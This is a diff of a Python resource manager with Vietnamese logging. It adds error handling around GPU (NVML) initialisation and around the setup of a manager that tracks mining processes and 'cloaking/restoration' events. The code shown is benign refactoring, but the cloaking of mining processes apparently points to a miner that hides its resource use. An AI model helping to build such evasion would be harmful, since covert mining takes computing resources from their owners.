@@ -74,14 +74,24 @@ class SharedResourceManager:
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
-        self.config = config
         self.logger = logger
-        self.resource_managers = resource_managers
-        self.power_manager = PowerManager()
-        self.strategy_cache = {}
-
-        self._nvml_init = False  # Trạng thái khởi tạo NVML
-
+        self.logger.info("Khởi tạo SharedResourceManager...")
+        
+        try:
+            self.config = config
+            self.resource_managers = resource_managers
+            self.power_manager = PowerManager()
+            self.strategy_cache = {}
+            
+            # Khởi tạo NVML
+            self._nvml_init = False  # Trạng thái khởi tạo NVML
+            self.logger.info("Đang khởi tạo NVML...")
+            self.initialize_nvml()
+            self.logger.info("SharedResourceManager đã được khởi tạo thành công.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi khởi tạo SharedResourceManager: {e}\n{traceback.format_exc()}")
+            raise RuntimeError("Không thể khởi tạo SharedResourceManager.") from e
+    
     def is_nvml_initialized(self) -> bool:
         """Kiểm tra pynvml đã khởi tạo hay chưa."""
         return self._nvml_init
@@ -93,9 +103,14 @@ class SharedResourceManager:
                 pynvml.nvmlInit()
                 self._nvml_init = True
                 self.logger.info("NVML đã được khởi tạo thành công.")
+            except pynvml.NVMLError_LibraryNotFound:
+                self.logger.error("Thư viện NVML không tìm thấy. Vui lòng kiểm tra container.")
+                raise
+            except pynvml.NVMLError_InsufficientPermissions:
+                self.logger.error("Không đủ quyền truy cập NVML. Kiểm tra quyền GPU.")
+                raise
             except pynvml.NVMLError as e:
-                self.logger.error(f"Lỗi khi khởi tạo NVML: {e}")
-                self._nvml_init = False
+                self.logger.error(f"Lỗi NVML không xác định: {e}")
                 raise
 
     async def shutdown_nvml(self):
@@ -275,28 +290,38 @@ class ResourceManager(IResourceManager):
             return
         self._initialized = True
 
-        self.config = config
-        self.event_bus = event_bus
         self.logger = logger
+        self.logger.info("Khởi tạo ResourceManager...")
 
-        self.stop_event = asyncio.Event()
-        self.resource_lock = aiorwlock.RWLock()
-        self.resource_adjustment_queue = AsyncQueue()
+        try:
+            self.config = config
+            self.event_bus = event_bus
 
-        # Danh sách tiến trình khai thác
-        self.mining_processes: List[MiningProcess] = []
-        self.mining_processes_lock = aiorwlock.RWLock()
+            # Biến dừng
+            self.stop_event = asyncio.Event()
 
-        # Dùng để sắp xếp thứ tự ưu tiên
-        self._counter = count()
-        self.watchers = []
+            # Lock và queue cho sự kiện cloaking/restoration
+            self.resource_lock = aiorwlock.RWLock()
+            self.resource_adjustment_queue = AsyncQueue()
 
-        # Khởi tạo SharedResourceManager sau
-        self.shared_resource_manager: Optional[SharedResourceManager] = None
+            # Danh sách tiến trình khai thác
+            self.mining_processes: List[MiningProcess] = []
+            self.mining_processes_lock = aiorwlock.RWLock()
 
-        # Đăng ký lắng nghe các sự kiện từ EventBus
-        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
+            # Dùng để sắp xếp thứ tự ưu tiên
+            self._counter = count()
+            self.watchers = []
 
+            # Đặt trạng thái khởi tạo của SharedResourceManager thành None
+            self.shared_resource_manager: Optional[SharedResourceManager] = None
+
+            self.logger.info("Đăng ký lắng nghe sự kiện resource_adjustment...")
+            self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
+
+        except Exception as e:
+            self.logger.error(f"Lỗi trong ResourceManager.__init__: {e}\n{traceback.format_exc()}")
+            raise RuntimeError("Không thể khởi tạo ResourceManager.") from e
+        
     async def start(self):
         """
         Khởi động ResourceManager.
@@ -305,8 +330,10 @@ class ResourceManager(IResourceManager):
 
         try:
             resource_managers = await ResourceControlFactory.create_resource_managers(logger=self.logger)
-            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
+            if not resource_managers:
+                raise RuntimeError("Không thể tạo ResourceControlFactory managers.")
             
+            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
             if not self.shared_resource_manager:
                 raise RuntimeError("SharedResourceManager không được khởi tạo.")
 
